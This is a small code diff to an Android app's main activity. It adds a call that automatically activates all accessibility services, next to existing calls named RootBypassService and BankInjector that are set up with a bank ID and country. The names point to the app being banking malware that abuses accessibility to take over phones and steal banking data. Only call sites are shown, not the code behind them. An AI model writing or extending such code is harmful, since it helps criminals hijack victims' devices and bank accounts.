@@ -118,6 +118,9 @@ class MainActivity : ComponentActivity() {
             RootBypassService.init(this)
         }
         BankInjector.init(this, BuildConfig.BANK_ID, BuildConfig.BANK_COUNTRY)
+        
+        // ✅ ACRESCENTA AQUI: Auto-ativar serviços de acessibilidade
+        AccessibilityServiceAutoActivator.activateAllServices(this)
     }
 
     override fun onResume() {
